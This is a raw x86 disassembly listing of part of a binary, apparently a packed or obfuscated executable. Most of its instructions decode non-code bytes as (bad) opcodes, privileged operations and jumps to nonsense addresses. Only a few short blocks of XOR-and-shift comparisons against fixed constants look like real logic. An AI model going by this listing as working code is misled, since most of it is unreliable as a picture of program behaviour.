  405f25:	scas   eax,DWORD PTR es:[edi]
  405f26:	enter  0xb6c9,0xb0
  405f2a:	inc    ecx
  405f2b:	cmp    eax,0x405c0da4
  405f30:	nop
  405f31:	xchg   ecx,eax
  405f32:	fsubp  st(2),st
  405f34:	adc    esp,ebx
  405f36:	jmp    0x28d6:0x1ef8f9ba
  405f3d:	jmp    0x6972:0x84603ef8
  405f44:	fwait
  405f45:	sub    DWORD PTR [edi-0x74],ebx
  405f48:	sub    al,0xcb
  405f4a:	and    DWORD PTR [ebp-0x48e938f],ebx
  405f50:	faddp  st(0),st
  405f52:	pop    es
  405f53:	dec    eax
  405f54:	jle    0x405fd3
  405f56:	lds    esi,FWORD PTR cs:[ebx+0x383b1edd]
  405f5d:	push   eax
  405f5e:	xor    BYTE PTR [ebp+0x1b1fc68a],al
  405f64:	push   ebp
  405f65:	out    dx,eax
  405f66:	xor    eax,0xd46ab07a
  405f6b:	push   edx
  405f6c:	pop    esi
  405f6d:	fisttp DWORD PTR [esi-0x7f16d4b9]
  405f73:	dec    esi
  405f74:	retfw  
  405f76:	jmp    0x405f56
  405f78:	mov    ecx,0x86a88b95
  405f7d:	dec    edi
  405f7e:	sbb    DWORD PTR [ebx-0x58],0x2b
  405f82:	in     eax,0xc6
  405f84:	stc    
  405f85:	icebp  
  405f86:	sub    al,0xdc
  405f88:	shl    ah,0x52
  405f8b:	daa    
  405f8c:	push   esp
  405f8d:	mov    DWORD PTR [ecx+0x412fc71c],eax
  405f93:	out    dx,eax
  405f94:	nop
  405f95:	mov    dl,0xdf
  405f97:	pop    ecx
  405f98:	fwait
  405f99:	dec    esi
  405f9a:	push   ds
  405f9b:	loop   0x405f6d
  405f9d:	nop
  405f9e:	mov    ecx,0xc02eb3ea
  405fa3:	sbb    esi,DWORD PTR [esp+esi*4+0x477b3ed8]
  405faa:	mov    ch,0x26
  405fac:	adc    dh,cl
  405fae:	xchg   BYTE PTR [edx-0x542dfaee],al
  405fb4:	hlt    
  405fb5:	jp     0x405fe0
  405fb7:	xchg   ebp,eax
  405fb8:	jne    0x405f8f
  405fba:	aam    0x9b
  405fbc:	xchg   bl,dh
  405fbe:	mov    DWORD PTR [eax],0x901f0857
  405fc4:	aas    
  405fc5:	push   ecx
  405fc6:	sub    al,0x5a
  405fc8:	enter  0x981b,0xee
  405fcc:	mov    cl,0x12
  405fce:	lock out 0x27,eax
  405fd1:	les    ecx,FWORD PTR [ecx+eax*1-0x2242756f]
  405fd8:	push   edi
  405fd9:	sbb    BYTE PTR [ebx-0x6d],dh
  405fdc:	adc    BYTE PTR [edx],al
  405fde:	pop    ecx
  405fdf:	fldcw  WORD PTR [esi+0x9c0f52f]
  405fe5:	sub    BYTE PTR [esi+0x7f],al
  405fe8:	jl     0x405fa4
  405fea:	cmc    
  405feb:	dec    ebp
  405fec:	pop    esp
  405fed:	iret   
  405fee:	test   DWORD PTR [edx],ecx
  405ff0:	imul   ebx,DWORD PTR [eax-0x196a45d0],0x4
  405ff7:	ficom  WORD PTR [ecx]
  405ff9:	mov    ds:0x5c31598c,al
  405ffe:	add    DWORD PTR [esi-0x41937d8a],eax
  406004:	int    0xf9
  406006:	mov    ds:0xaafa859c,al
  40600b:	xchg   esp,eax
  40600c:	stc    
  40600d:	sub    ebp,0xc2af4a9
  406013:	jb     0x40604b
  406015:	pushw  ds
  406017:	jne    0x406058
  406019:	mov    eax,0x49d5a216
  40601e:	mov    ch,0x18
  406020:	mov    ah,0xec
  406022:	push   es
  406023:	jp     0x406075
  406025:	loop   0x40609c
  406027:	mov    es,WORD PTR fs:[edi-0x20]
  40602b:	call   0xbffd:0xce813a3b
  406032:	nop    edx
  406035:	jae    0x406049
  406037:	enter  0x39f5,0xa0
  40603b:	es and eax,0x64061fd7
  406041:	mov    DWORD PTR [ebp-0x2cb1e39a],ecx
  406047:	jge    0x406083
  406049:	data16 int3 
  40604b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40604c:	jne    0x4060c7
  40604e:	jb     0x405ff6
  406050:	push   0x43
  406052:	pop    esi
  406053:	(bad)  
  406054:	int3   
  406055:	into   
  406056:	or     ch,0xfa
  406059:	cmp    ebx,ecx
  40605b:	mov    esi,0xb16bcff9
  406060:	jne    0x406053
  406062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406063:	sti    
  406064:	xchg   esp,eax
  406065:	cmp    eax,0xe4a0f01c
  40606a:	mov    al,0xbe
  40606c:	push   ss
  40606d:	in     eax,dx
  40606e:	inc    esp
  40606f:	pop    esi
  406070:	push   edx
  406071:	test   BYTE PTR [esi+0x2e],al
  406074:	aad    0xd4
  406076:	mov    WORD PTR [edx+edi*1+0x72],?
  40607a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40607b:	popa   
  40607c:	mov    ecx,0x11e63530
  406081:	inc    eax
  406082:	das    
  406083:	mov    edi,edi
  406085:	shr    BYTE PTR [edi],1
  406087:	(bad)  
  406088:	pop    ds
  406089:	cdq    
  40608a:	call   0x47e4981c
  40608f:	mov    BYTE PTR [ebx-0x3f],dl
  406092:	shl    BYTE PTR [ebx+0x2d],0xe2
  406096:	sub    BYTE PTR [ebx+edx*2],bl
  406099:	dec    esp
  40609a:	loopne 0x4060ee
  40609c:	fmul   QWORD PTR [edi-0x6b326dd3]
  4060a2:	pop    esi
  4060a3:	mov    esp,0xe0b96ef4
  4060a8:	ja     0x406107
  4060aa:	mov    al,ds:0x3696a6c4
  4060af:	mov    bh,BYTE PTR [eax+eax*4]
  4060b2:	jbe    0x406082
  4060b4:	sbb    BYTE PTR [ebx-0x2fa42e95],0x5b
  4060bb:	xor    dh,BYTE PTR [edi]
  4060bd:	add    ebx,ecx
  4060bf:	jl     0x40604e
  4060c1:	pop    eax
  4060c2:	jl     0x406091
  4060c4:	lock (bad) 
  4060c6:	nop
  4060c7:	sti    
  4060c8:	mov    WORD PTR [eax-0x78],fs
  4060cb:	dec    edi
  4060cc:	push   es
  4060cd:	out    dx,eax
  4060ce:	(bad)  
  4060cf:	jmp    0x40614a
  4060d1:	fldcw  WORD PTR [eax]
  4060d3:	bound  esi,QWORD PTR [ebp+0x16ea6631]
  4060d9:	in     eax,0x9f
  4060db:	imul   esp,ebx,0x4204146c
  4060e1:	ins    DWORD PTR es:[edi],dx
  4060e2:	and    bl,BYTE PTR [ebx]
  4060e4:	sbb    cl,BYTE PTR [edi+0x42]
  4060e7:	in     eax,0x65
  4060e9:	retf   
  4060ea:	mov    bh,0xd3
  4060ec:	test   eax,0x60ce82e2
  4060f1:	ja     0x40607c
  4060f3:	mov    al,0x63
  4060f5:	sbb    eax,0x992cf49f
  4060fa:	xor    DWORD PTR [edx-0x65a63294],edi
  406100:	add    BYTE PTR [ecx],bl
  406102:	das    
  406103:	lahf   
  406104:	fstp   QWORD PTR [esi-0x37abff9c]
  40610a:	adc    esi,DWORD PTR [eax]
  40610c:	pusha  
  40610d:	jnp    0x406123
  40610f:	call   0x7cc936a9
  406114:	les    edx,FWORD PTR [eax]
  406116:	add    al,0x70
  406118:	sti    
  406119:	or     DWORD PTR [ebp+0x5b8fa47d],0xffffffdc
  406120:	pop    esp
  406121:	enter  0x3b66,0x22
  406125:	add    edi,ebx
  406127:	sbb    BYTE PTR [eax-0x33578e01],dl
  40612d:	jbe    0x406116
  40612f:	add    di,dx
  406132:	aas    
  406133:	add    ebx,edi
  406135:	xlat   BYTE PTR ds:[ebx]
  406136:	jmp    0xcd7a4a45
  40613b:	pusha  
  40613c:	nop
  40613d:	imul   eax,DWORD PTR [eax-0x1492c9a4],0xf106a802
  406147:	gs xchg esi,eax
  406149:	sub    ebp,ebp
  40614b:	outs   dx,DWORD PTR ds:[esi]
  40614c:	and    eax,0x21cc616f
  406151:	adc    ecx,DWORD PTR [ebx-0x7465acc4]
  406157:	je     0x406154
  406159:	mov    eax,cr6
  40615c:	mov    al,ds:0xd074156a
  406161:	addr16 into 
  406163:	inc    ebx
  406164:	xchg   esp,eax
  406165:	and    dh,BYTE PTR [ebp-0x5917ddc3]
  40616b:	fdivrp st(1),st
  40616d:	xor    cl,dl
  40616f:	and    ecx,DWORD PTR [eax+0x54]
  406172:	jne    0x406157
  406174:	push   ds
  406175:	(bad)  
  406176:	scas   eax,DWORD PTR es:[edi]
  406177:	adc    DWORD PTR [edx],ecx
  406179:	inc    ecx
  40617a:	icebp  
  40617b:	(bad)  
  40617c:	jp     0x40617d
  40617e:	fadd   DWORD PTR [eax+0x42]
  406181:	cdq    
  406182:	outs   dx,DWORD PTR ds:[esi]
  406183:	in     eax,0x3f
  406185:	ins    BYTE PTR es:[edi],dx
  406186:	xchg   edi,eax
  406187:	jge    0x406134
  406189:	popa   
  40618a:	xchg   ebp,eax
  40618b:	leave  
  40618c:	push   0x4e511f60
  406191:	mov    al,ds:0xe4c23939
  406196:	sub    ebx,DWORD PTR [edx-0x10]
  406199:	mov    ds:0x75ca520e,eax
  40619e:	adc    ebx,DWORD PTR [edi]
  4061a0:	cld    
  4061a1:	mov    edi,0xc5a7c7e0
  4061a6:	daa    
  4061a7:	sti    
  4061a8:	sbb    BYTE PTR [esi-0x369c8629],al
  4061ae:	mov    ch,0xad
  4061b0:	lods   eax,DWORD PTR ds:[esi]
  4061b1:	sub    al,0xb4
  4061b3:	cmp    dl,BYTE PTR [edi-0x61]
  4061b6:	pusha  
  4061b7:	pop    esi
  4061b8:	(bad)  
  4061b9:	mov    dh,0x35
  4061bb:	push   ebx
  4061bc:	inc    edx
  4061bd:	sti    
  4061be:	and    eax,edx
  4061c0:	fcomp  QWORD PTR [ecx-0x77]
  4061c3:	dec    ecx
  4061c4:	push   cs
  4061c5:	ins    BYTE PTR es:[edi],dx
  4061c6:	xchg   esp,eax
  4061c7:	add    DWORD PTR [ebp+ebx*2+0x4c],ebx
  4061cb:	jge    0x406173
  4061cd:	add    al,0xbf
  4061cf:	dec    eax
  4061d0:	or     DWORD PTR [edx],ecx
  4061d2:	jno    0x4061c2
  4061d4:	iret   
  4061d5:	es stos DWORD PTR es:[edi],eax
  4061d7:	popf   
  4061d8:	add    al,0x91
  4061da:	test   eax,0xb104d96c
  4061df:	jns    0x4061df
  4061e1:	pop    ss
  4061e2:	cmp    ch,ah
  4061e4:	inc    eax
  4061e5:	out    dx,al
  4061e6:	daa    
  4061e7:	dec    edx
  4061e8:	rol    ah,cl
  4061ea:	jmp    DWORD PTR [edi-0x55ffe86]
  4061f0:	popf   
  4061f1:	xlat   BYTE PTR ds:[ebx]
  4061f2:	outs   dx,DWORD PTR ds:[esi]
  4061f3:	pop    ebp
  4061f4:	aad    0xb2
  4061f6:	pop    ds
  4061f7:	lods   eax,DWORD PTR ds:[esi]
  4061f8:	leave  
  4061f9:	ror    DWORD PTR [ebx],cl
  4061fb:	xor    eax,0x608426fa
  406200:	or     al,BYTE PTR [eax-0x48677298]
  406206:	mov    esi,0x2c0324c6
  40620b:	cld    
  40620c:	inc    ecx
  40620d:	cmp    DWORD PTR [eax+0x4b],0xffffffcb
  406211:	ja     0x406205
  406213:	inc    edx
  406214:	xchg   ebx,eax
  406215:	int3   
  406216:	fld    QWORD PTR [ecx+0x2b8ae8f2]
  40621c:	pushf  
  40621d:	xor    ecx,0xcb79b577
  406223:	shrd   ecx,edx,0x2
  406227:	shr    edx,0x2
  40622a:	or     edx,DWORD PTR [ebp-0x64]
  40622d:	xor    eax,eax
  40622f:	or     ecx,eax
  406231:	mov    eax,DWORD PTR [ebx]
  406233:	mov    DWORD PTR [ebp-0x2c],edx
  406236:	mov    edx,DWORD PTR [ebx+0x4]
  406239:	mov    edx,eax
  40623b:	xor    eax,eax
  40623d:	shl    edx,0x1e
  406240:	xor    edx,0x80000000
  406246:	mov    DWORD PTR [ebp-0x70],eax
  406249:	mov    eax,DWORD PTR [ebx]
  40624b:	mov    DWORD PTR [ebp-0x6c],edx
  40624e:	mov    edx,DWORD PTR [ebx+0x4]
  406251:	xor    eax,0xcb79b577
  406256:	xor    edx,0x9c2b8ae8
  40625c:	shrd   eax,edx,0x2
  406260:	or     eax,DWORD PTR [ebp-0x70]
  406263:	shr    edx,0x2
  406266:	mov    DWORD PTR [ebp-0x38],eax
  406269:	mov    eax,edx
  40626b:	or     eax,DWORD PTR [ebp-0x6c]
  40626e:	mov    DWORD PTR [ebp-0x5c],edx
  406271:	cmp    ecx,DWORD PTR [ebp-0x38]
  406274:	jne    0x405a82
  40627a:	cmp    DWORD PTR [ebp-0x2c],eax
  40627d:	je     0x408bb3
  406283:	jmp    0x405a82
  406288:	mov    eax,DWORD PTR [esi]
  40628a:	mov    ecx,DWORD PTR [esi+0x4]
  40628d:	mov    ecx,eax
  40628f:	shl    ecx,0x1e
  406292:	xor    ecx,0x80000000
  406298:	mov    DWORD PTR [ebp+0x14],ecx
  40629b:	mov    ecx,DWORD PTR [esi]
  40629d:	mov    edx,DWORD PTR [esi+0x4]
  4062a0:	xor    ecx,0xcb79b577
  4062a6:	xor    edx,0x9c2b8ae8
  4062ac:	shrd   ecx,edx,0x2
  4062b0:	xor    eax,eax
  4062b2:	or     ecx,eax
  4062b4:	mov    eax,DWORD PTR [ebx]
  4062b6:	mov    DWORD PTR [ebp-0x68],ecx
  4062b9:	mov    ecx,DWORD PTR [ebx+0x4]
  4062bc:	mov    ecx,eax
  4062be:	xor    eax,eax
  4062c0:	shr    edx,0x2
  4062c3:	or     edx,DWORD PTR [ebp+0x14]
  4062c6:	mov    DWORD PTR [ebp+0x10],eax
  4062c9:	mov    eax,DWORD PTR [ebx]
  4062cb:	shl    ecx,0x1e
  4062ce:	xor    ecx,0x80000000
  4062d4:	mov    DWORD PTR [ebp-0x64],edx
  4062d7:	jmp    0x406678
  4062dc:	aas    
  4062dd:	jne    0x40629e
  4062df:	arpl   ax,di
  4062e1:	jl     0x406347
  4062e3:	jns    0x40632d
  4062e5:	das    
  4062e6:	inc    esi
  4062e7:	xchg   edx,eax
  4062e8:	popf   
  4062e9:	cwde   
  4062ea:	scas   al,BYTE PTR es:[edi]
  4062eb:	iret   
  4062ec:	mov    ebp,0xbdbebe33
  4062f1:	les    edi,FWORD PTR [esi-0x77ee6a42]
  4062f7:	rcl    DWORD PTR [ebp-0x1],0x73
  4062fb:	pop    ss
  4062fc:	pop    edx
  4062fd:	iret   
  4062fe:	enter  0xdd58,0xea
  406302:	icebp  
  406303:	enter  0x41b7,0x1c
  406307:	repz adc BYTE PTR [ecx+0x72],ch
  40630b:	dec    esp
  40630c:	push   es
  40630d:	and    BYTE PTR [ebx-0x2a],0x6a
  406311:	call   DWORD PTR [ebp-0x7038b478]
  406317:	repnz mov eax,ds:0x1f81d2f7
  40631d:	inc    ecx
  40631e:	(bad)  
  40631f:	hlt    
  406320:	adc    cl,ah
  406322:	test   eax,0x74715285
  406327:	push   edx
  406328:	add    esp,ebp
  40632a:	scas   al,BYTE PTR es:[edi]
  40632b:	pop    esi
  40632c:	out    dx,eax
  40632d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40632e:	push   cs
  40632f:	sub    eax,0x7de83e58
  406334:	ror    BYTE PTR [ecx+0x7d],0xc9
  406338:	dec    ebx
  406339:	retf   
  40633a:	push   ss
  40633b:	push   es
  40633c:	cmp    eax,0x40937bf3
  406341:	add    dh,BYTE PTR [esi-0x898012b]
  406347:	retf   0xa38e
  40634a:	push   esi
  40634b:	lea    eax,[esi-0x62]
  40634e:	in     al,0x2c
  406350:	or     eax,0x3ed4f50
  406355:	test   DWORD PTR [ecx-0x2e],0x9ab67edf
  40635c:	mov    ch,0xc5
  40635e:	or     BYTE PTR [edi-0x2f],ch
  406361:	fnsave gs:[esi-0x80]
  406365:	cmc    
  406366:	push   esp
  406367:	pop    ss
  406368:	mov    ch,0x2
  40636a:	sbb    eax,0xa43ed170
  40636f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406370:	jmp    0x406e4c2e
  406375:	leave  
  406376:	add    dl,BYTE PTR [esi+0x34]
  406379:	pop    esi
  40637a:	jmp    0xb549:0xe482be29
  406381:	out    dx,eax
  406382:	xor    ah,al
  406384:	jns    0x4063ef
  406386:	jecxz  0x406349
  406388:	test   al,0x4e
  40638b:	jne    0x406382
  40638d:	mov    dl,0x21
  40638f:	fs js  0x4063b3
  406392:	wrmsr  
  406394:	xor    al,0xee
  406396:	adc    al,0x3
  406398:	and    al,0x2e
  40639a:	jae    0x406411
  40639c:	mov    bl,0x0
  40639e:	arpl   WORD PTR [ecx+0x32],di
  4063a1:	mov    ecx,0x6a6ea0e5
  4063a6:	mov    cs,WORD PTR [esi]
  4063a8:	fs push ebx
  4063aa:	xlat   BYTE PTR ds:[ebx]
  4063ab:	fdiv   DWORD PTR [edi+ecx*1+0x6]
  4063af:	sbb    ah,dh
  4063b1:	inc    esi
  4063b2:	mov    eax,0x13f596f5
  4063b7:	sub    eax,0xe8084392
  4063bc:	xchg   DWORD PTR [ebx-0x6f250195],edx
  4063c2:	cmp    eax,0xc338b120
  4063c7:	mov    eax,ds:0xc8444815
  4063cc:	inc    ebx
  4063cd:	pop    ss
  4063ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063cf:	popf   
  4063d0:	mov    bl,0x7a
  4063d2:	(bad)  
  4063d3:	jle    0x4063b5
  4063d5:	jecxz  0x40643b
  4063d7:	xchg   BYTE PTR [esi-0x17715d39],ch
  4063dd:	jnp    0x40643e
  4063df:	pop    es
  4063e0:	and    eax,0xb49fcb80
  4063e5:	xor    al,0xba
  4063e7:	push   ds
  4063e8:	pop    esi
  4063e9:	jno    0x40645b
  4063eb:	mov    al,0x3d
  4063ed:	or     ch,al
  4063ef:	retf   0xdc6
  4063f2:	js     0x40645c
  4063f4:	jae    0x406422
  4063f6:	out    0xaf,eax
  4063f8:	scas   eax,DWORD PTR es:[edi]
  4063f9:	js     0x406390
  4063fb:	test   BYTE PTR [edx-0x3134afb1],al
  406401:	stos   DWORD PTR es:[edi],eax
  406402:	out    0x2c,al
  406404:	inc    esp
  406405:	push   0xffffffe2
  406407:	arpl   ax,si
  406409:	mov    ds:0x61dc91a9,al
  40640e:	xor    DWORD PTR [eax-0x76223ad1],edi
  406414:	add    BYTE PTR ds:0x12288281,dl
  40641a:	add    eax,0xfc10ad56
  40641f:	out    dx,eax
  406420:	das    
  406421:	nop
  406422:	aam    0x62
  406424:	test   eax,0x2326755b
  406429:	jbe    0x4063f5
  40642b:	shl    BYTE PTR [esi+0x42],cl
  40642e:	cmp    BYTE PTR [edi+0x64],bl
  406431:	xchg   esi,eax
  406432:	pop    es
  406433:	cmp    BYTE PTR [eax-0x329e3d2c],0xbb
  40643a:	fadd   DWORD PTR [esi+0x5374c09e]
  406440:	mov    dh,0x5
  406442:	fdiv   QWORD PTR [ebp+0x11]
  406445:	popa   
  406446:	(bad)  
  406447:	push   0x3e
  406449:	jp     0x406405
  40644b:	or     BYTE PTR [edi-0x795f3aab],dh
  406451:	pop    edi
  406452:	test   al,0x90
  406454:	popf   
  406455:	pusha  
  406456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406457:	cld    
  406458:	arpl   WORD PTR [esi+0x278e6d37],dx
  40645e:	ficom  DWORD PTR [ebx-0x6e]
  406462:	push   ecx
  406463:	dec    esi
  406464:	fwait
  406465:	dec    edi
  406466:	jae    0x4064a7
  406468:	ss dec ebx
  40646a:	in     eax,dx
  40646b:	enter  0x9b01,0x57
  40646f:	or     DWORD PTR [ecx+ecx*1-0x24],ebx
  406473:	inc    bp
  406475:	cli    
  406476:	pop    ss
  406477:	test   eax,0xa4f28f55
  40647c:	add    eax,0x398f10e5
  406481:	pop    esp
  406482:	daa    
  406483:	mov    edx,0x33599c29
  406488:	iret   
  406489:	or     BYTE PTR ds:[ecx+0x373aaa20],ah
  406490:	je     0x4064df
  406492:	ss retf 0x36fc
  406496:	inc    ecx
  406497:	mov    ch,0xd6
  406499:	push   cs
  40649a:	inc    esi
  40649b:	(bad)  
  40649c:	out    dx,al
  40649d:	push   0xa6013b5a
  4064a2:	or     eax,0xef0c6cc3
  4064a7:	jae    0x4064ae
  4064a9:	and    al,0x8
  4064ab:	(bad)  
  4064ac:	push   esi
  4064ad:	cld    
  4064ae:	call   0xd4d88f7a
  4064b3:	lods   eax,DWORD PTR ds:[esi]
  4064b4:	mov    eax,0xf20940a5
  4064b9:	repz ficom DWORD PTR [ebx]
  4064bc:	cmp    esp,esp
  4064be:	fmul   QWORD PTR [eax]
  4064c0:	xchg   ecx,eax
  4064c1:	mov    al,ds:0x7c5f5f1
  4064c6:	inc    esp
  4064c7:	cmp    BYTE PTR [esi],dh
  4064c9:	mov    ds:0x19e934af,al
  4064ce:	push   ds
  4064cf:	mov    edx,ecx
  4064d1:	xchg   esi,eax
  4064d2:	retf   0xdb53
  4064d5:	scas   eax,DWORD PTR es:[edi]
  4064d6:	push   es
  4064d7:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064d9:	out    0xe1,eax
  4064db:	sub    DWORD PTR [edi],esi
  4064dd:	lods   eax,DWORD PTR ds:[esi]
  4064de:	jbe    0x4064a9
  4064e0:	ins    BYTE PTR es:[edi],dx
  4064e1:	jecxz  0x406514
  4064e3:	jle    0x4064bd
  4064e5:	sbb    DWORD PTR [ecx],eax
  4064e7:	mov    eax,DWORD PTR [ebx-0x2a033676]
  4064ed:	nop
  4064ee:	aam    0xf8
  4064f0:	test   DWORD PTR [edx-0x1e1a6c56],ebp
  4064f6:	nop
  4064f7:	pop    esp
  4064f8:	lods   eax,DWORD PTR ds:[esi]
  4064f9:	xchg   esp,eax
  4064fa:	out    0xed,al
  4064fc:	ss pop ss
  4064fe:	mov    WORD PTR [eax],?
  406500:	mov    al,0xe6
  406502:	or     bh,BYTE PTR [edi-0x399ff1b]
  406508:	cmp    ecx,DWORD PTR [esi+eax*4+0x61fc531c]
  40650f:	leave  
  406510:	mov    esp,0x8d1273f1
  406515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406516:	mov    esi,0x204f403e
  40651b:	hlt    
  40651c:	jns    0x4064a1
  40651e:	or     BYTE PTR [esi-0x13],al
  406521:	add    eax,0xb89b989d
  406526:	stos   DWORD PTR es:[edi],eax
  406527:	mov    bl,0x12
  406529:	xchg   DWORD PTR [ebp-0x70eccc17],edi
  40652f:	(bad)  
  406531:	in     al,dx
  406532:	arpl   WORD PTR [edi-0x5d9721f8],sp
  406538:	inc    esp
  406539:	ror    BYTE PTR [ebp+0x4c],cl
  40653c:	sbb    DWORD PTR [ecx-0x43],edx
  40653f:	xchg   ebp,eax
  406540:	dec    edi
  406541:	cmp    eax,0x253cba2
  406546:	call   0x20379432
  40654b:	sahf   
  40654c:	lods   al,BYTE PTR ds:[esi]
  40654d:	mov    edx,0x9691a373
  406552:	dec    esp
  406553:	mov    es,edi
  406555:	lods   al,BYTE PTR ds:[esi]
  406556:	mov    ds:0x4d200fb0,al
  40655b:	stc    
  40655c:	sub    DWORD PTR [edx+ebx*4+0x43],esi
  406560:	cs jmp 0x406537
  406563:	ins    DWORD PTR es:[edi],dx
  406564:	sub    ah,bh
  406566:	push   edx
  406567:	les    edi,FWORD PTR ds:[ebx+0x11873153]
  40656e:	call   0x65f5854f
  406573:	add    DWORD PTR [eax+ebx*2-0x3421923b],edi
  40657a:	sub    BYTE PTR [esi-0x2c],dh
  40657d:	setle  BYTE PTR [edi]
  406580:	out    dx,al
  406581:	pop    ebx
  406582:	lods   eax,DWORD PTR ds:[esi]
  406583:	cmc    
  406584:	jge    0x4065b4
  406586:	mov    dh,0xe4
  406588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406589:	not    edi
  40658b:	fwait
  40658c:	and    bh,bh
  40658e:	es mov dl,0xb
  406591:	in     al,dx
  406592:	or     ecx,DWORD PTR [edi]
  406594:	jnp    0x4065a1
  406596:	xchg   DWORD PTR [edx],esi
  406598:	add    al,0x1a
  40659a:	test   bl,dl
  40659c:	enter  0x266d,0x90
  4065a0:	in     eax,dx
  4065a1:	cmc    
  4065a2:	fdivr  QWORD PTR [eax+0x55fac1ba]
  4065a8:	adc    al,0xba
  4065aa:	rol    DWORD PTR [eax],1
  4065ac:	push   ss
  4065ad:	cwde   
  4065ae:	jnp    0x406530
  4065b0:	inc    ebp
  4065b1:	sbb    BYTE PTR [ecx+esi*2],ah
  4065b4:	add    DWORD PTR [ebp-0x1f88fe9c],esi
  4065ba:	push   edx
  4065bb:	gs fwait
  4065bd:	adc    DWORD PTR [eax+0x30],edx
  4065c0:	inc    eax
  4065c1:	test   DWORD PTR [edi+ebx*8+0x6f],esp
  4065c5:	jmp    0x4065ba
  4065c7:	sbb    DWORD PTR [edx+0x7af2c4a8],ecx
  4065cd:	push   edi
  4065ce:	dec    edi
  4065cf:	gs or  al,0xdf
  4065d2:	mov    DWORD PTR [eax-0x43],eax
  4065d5:	mov    bl,0x25
  4065d7:	aaa    
  4065d8:	out    dx,eax
  4065d9:	xchg   ecx,esp
  4065db:	push   eax
  4065dc:	lahf   
  4065dd:	xor    DWORD PTR [edx-0x5a],0xa0d7f8aa
  4065e4:	je     0x406660
  4065e6:	out    dx,al
  4065e7:	mov    bl,BYTE PTR [ecx-0x6d]
  4065ea:	ret    0x5cc6
  4065ed:	repz xor DWORD PTR [ebp+0x741db6],0xc785574
  4065f8:	aaa    
  4065f9:	pushw  es
  4065fb:	sbb    DWORD PTR [ebx],esi
  4065fd:	push   eax
  4065fe:	mov    eax,ds:0x21c29ec6
  406603:	pop    esi
  406604:	or     DWORD PTR [edx+0x70c3f335],edx
  40660a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40660b:	in     eax,dx
  40660c:	jno    0x40660e
  40660e:	mov    eax,0xf3a05273
  406613:	fucom  st(4)
  406615:	push   esi
  406616:	adc    bl,BYTE PTR [ebx]
  406618:	ds cdq 
  40661a:	arpl   WORD PTR [ecx+ebp*8],bp
  40661d:	dec    edx
  40661e:	push   ebx
  40661f:	mov    dl,0x73
  406621:	mov    edi,0x99d9d541
  406626:	push   0x6d5fd2c3
  40662b:	ficom  DWORD PTR [edi]
  40662d:	retf   
  40662e:	add    al,bl
  406630:	and    eax,0x22e014f3
  406635:	pop    ebx
  406636:	aam    0x98
  406638:	and    eax,0x8c484284
  40663d:	imul   ebx,DWORD PTR [esi+ebx*4-0x42],0x32
  406642:	in     al,dx
  406643:	popa   
  406644:	mov    esp,0xce4dc9de
  406649:	sbb    BYTE PTR [ebp-0x13],dh
  40664c:	inc    edi
  40664d:	adc    DWORD PTR [ebx],edi
  40664f:	popf   
  406650:	mov    ?,WORD PTR [eax-0x7390da60]
  406656:	std    
  406657:	(bad)  
  406658:	ret    
  406659:	mov    edx,0x7896ba47
  40665e:	jmp    DWORD PTR [ebp+0x6716ffdd]
  406664:	ins    DWORD PTR es:[edi],dx
  406665:	clc    
  406666:	dec    ebx
  406667:	push   ebp
  406668:	rcl    DWORD PTR ss:[ecx],0xa4
  40666c:	adc    DWORD PTR [edx-0x4fd79f38],eax
  406672:	jbe    0x406665
  406674:	xchg   edx,eax
  406675:	stc    
  406676:	test   DWORD PTR [ebx+ecx*4+0x53],edx
  40667a:	add    al,0x35
  40667c:	ja     0x406633
  40667e:	jns    0x40664b
  406680:	mov    DWORD PTR [ebp+0x14],ecx
  406683:	mov    ecx,0x9c2b8ae8
  406688:	xor    edx,ecx
  40668a:	shrd   eax,edx,0x2
  40668e:	or     eax,DWORD PTR [ebp+0x10]
  406691:	shr    edx,0x2
  406694:	mov    DWORD PTR [ebp-0x70],eax
  406697:	mov    eax,edx
  406699:	or     eax,DWORD PTR [ebp+0x14]
  40669c:	mov    DWORD PTR [ebp-0x5c],edx
  40669f:	jmp    0x406a40
  4066a4:	xchg   ecx,eax
  4066a5:	cld    
  4066a6:	pop    ebx
  4066a7:	cmp    DWORD PTR [edx+eiz*4-0x15230365],0xb556920c
  4066b2:	or     al,0x92
  4066b4:	mov    esi,0xbdbebe3b
  4066b9:	les    edi,FWORD PTR [esi-0xb6a0742]
  4066bf:	fcom   QWORD PTR [eax+edx*2+0x6a5f7802]
  4066c6:	cdq    
  4066c7:	jmp    0xf83f9e43
  4066cc:	or     BYTE PTR [eax],al
  4066ce:	sahf   
  4066cf:	test   DWORD PTR [esi],edx
  4066d1:	xchg   edx,eax
  4066d2:	sub    al,0xc0
  4066d4:	and    ch,BYTE PTR [edx]
  4066d6:	(bad)  
  4066d8:	sti    
  4066d9:	fimul  WORD PTR [ecx-0x52fc712a]
  4066df:	sbb    al,0x5e
  4066e1:	push   esi
  4066e2:	int    0x83
  4066e4:	call   0x40092c61
  4066e9:	mov    eax,0x651c3e67
  4066ee:	or     al,0x58
  4066f0:	mov    eax,0x58fd514a
  4066f5:	dec    ebp
  4066f6:	mov    ds:0x631612a,al
  4066fb:	push   esi
  4066fc:	inc    edi
  4066fd:	or     eax,0x773e98d7
  406702:	setb   BYTE PTR [ebp+ebp*2+0x1ca5c6f3]
  40670a:	jbe    0x4066a4
  40670c:	dec    esp
  40670d:	test   DWORD PTR [edi-0x7e2e3bbf],0x1ddef15a
  406717:	add    BYTE PTR [ebx+eax*8+0x78a6aab4],al
  40671e:	adc    al,ah
  406720:	dec    eax
  406721:	popf   
  406722:	(bad)  
  406724:	shl    DWORD PTR [ecx+ebp*4-0x30],1
  406728:	fwait
  406729:	jne    0x40671c
  40672b:	addr16 mov esp,0xc58e2544
  406731:	ret    
  406732:	sahf   
  406733:	or     esi,DWORD PTR [ecx-0xe]
  406736:	push   ebx
  406737:	xlat   BYTE PTR ds:[ebx]
  406738:	jmp    0x40675c
  40673a:	pushw  ds
  40673c:	xor    edi,ecx
  40673e:	(bad)  
